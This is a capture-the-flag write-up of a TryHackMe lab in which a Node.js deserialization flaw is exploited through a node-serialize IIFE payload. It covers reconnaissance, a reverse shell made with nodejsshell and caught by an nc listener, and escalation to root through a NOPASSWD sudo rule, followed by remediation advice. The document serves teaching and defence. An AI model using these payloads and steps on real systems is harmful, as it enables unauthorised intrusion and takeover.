# TryHackMe Writeup: Node.js Deserialization RCE

## Executive Summary

This challenge demonstrates a **critical vulnerability in Node.js object deserialization** combined with **Immediately Invoked Function Expressions (IIFE)** to achieve Remote Code Execution (RCE). The vulnerability allows an unauthenticated attacker to gain shell access and escalate privileges to root.

---

## Reconnaissance

### Network Scanning

Initial reconnaissance was performed using Nmap to identify open services:

```bash
sudo nmap -sV -sC -O -p- -n -Pn 10.113.169.252
```

**Results:**
- SSH (port 22) - OpenSSH
- HTTP (port 80) - Web application

### Web Application Analysis

Upon accessing the HTTP service, the application was found to accept POST requests that process user input. Network inspection revealed:

- **Input Method:** POST request with user-supplied data
- **Encoding:** User input was Base64-encoded
- **Backend Processing:** The encoded data contained serialized JavaScript objects
- **Vulnerability Type:** Unsafe deserialization leading to code execution

---

## Vulnerability Assessment

### Deserialization Vulnerability

The backend application deserializes user input without proper validation. This is a common vulnerability in Node.js applications that use libraries like `node-serialize` or similar implementations.

### Code Execution Testing

Initial testing confirmed code execution through function evaluation:

```javascript
_$$ND_FUNC$$_function (){ return 'hi'; }()
```

**Result:** The application returned `hi`, confirming that arbitrary code could be executed through IIFE syntax.

### Attack Vector

The vulnerability can be exploited by:
1. Crafting a malicious serialized JavaScript function
2. Encoding it in Base64
3. Sending it via POST request
4. The backend deserializes and executes the code via `eval()` or similar

---

## Exploitation

### Reverse Shell Generation

A reverse shell payload was generated using a Node.js shell generator tool:

```bash
nodejsshell <VPN_IP> 4444
```

The tool generates an obfuscated payload using `String.fromCharCode()` encoding to:
- Establish a network connection to the attacker's machine
- Spawn a `/bin/sh` shell
- Redirect shell I/O through the network connection
- Implement auto-reconnection on connection failure

### Exploitation Steps

**Step 1: Setup Listener**

```bash
nc -lvnp 4444
```

**Step 2: Deliver Payload**

The Base64-encoded reverse shell payload was passed through the vulnerable POST parameter.

**Step 3: Gain Shell Access**

Upon execution, a reverse shell connection was established, providing command-line access to the target system.

---

## Post-Exploitation

### User Flag Recovery

Located the user flag using directory traversal:

```bash
find / -name user.txt -type f 2> /dev/null
```

**Location:** `/home/dylan/user.txt`

### Privilege Escalation

Examined sudo privileges:

```bash
sudo -l
```

**Finding:** The current user was configured to execute `su` without password authentication (NOPASSWD privilege).

### Privilege Escalation Execution

```bash
sudo su
```

Successfully escalated to root user.

### Root Flag Recovery

Located the root flag:

```bash
find / -name root.txt -type f 2> /dev/null
```

**Location:** `/root/root.txt`

---

## Vulnerability Chain Summary

| Step | Vulnerability | Impact |
|------|---------------|--------|
| 1 | Unsafe Deserialization | Code Execution |
| 2 | IIFE Function Evaluation | RCE Confirmation |
| 3 | Improper Sudo Configuration | Privilege Escalation to Root |

---

## Remediation & Defense

### For Developers

1. **Never use `eval()` on untrusted input**
   ```javascript
   // VULNERABLE
   eval(userInput);
   
   // SECURE
   // Use JSON.parse() for serialized data
   const obj = JSON.parse(userInput);
   ```

2. **Implement Input Validation**
   - Whitelist acceptable object structures
   - Validate data types before processing

3. **Use Safe Deserialization Libraries**
   - Prefer `JSON.parse()` over custom serialization
   - If using third-party libraries, keep them updated

4. **Apply Principle of Least Privilege**
   ```bash
   # VULNERABLE
   user ALL=(ALL) NOPASSWD: /bin/su
   
   # SECURE - Avoid NOPASSWD for privilege escalation
   user ALL=(ALL) /specific/command
   ```

### For System Administrators

1. Implement strict sudo policies
2. Require password authentication for sensitive commands
3. Monitor and audit privilege escalation attempts
4. Regular security updates for all software

---

## CVSS v3.1 Severity Assessment

- **Severity:** CRITICAL (CVSS 9.8)
- **Attack Vector:** Network
- **Authentication:** None Required
- **User Interaction:** None
- **Scope:** Unchanged
- **Confidentiality:** High
- **Integrity:** High
- **Availability:** High

---

## Lessons Learned

1. **Defense in Depth:** Multiple security layers failed (deserialization + sudo misconfiguration)
2. **Input Validation:** Critical for preventing injection attacks
3. **Privilege Management:** NOPASSWD sudo configurations are extremely dangerous
4. **Code Execution Prevention:** Never evaluate untrusted code

---

## References

- [OWASP: Deserialization of Untrusted Data](https://owasp.org/www-community/deserialization-of-untrusted-data)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)

---

**Report Date:** 2026
**Challenge Platform:** TryHackMe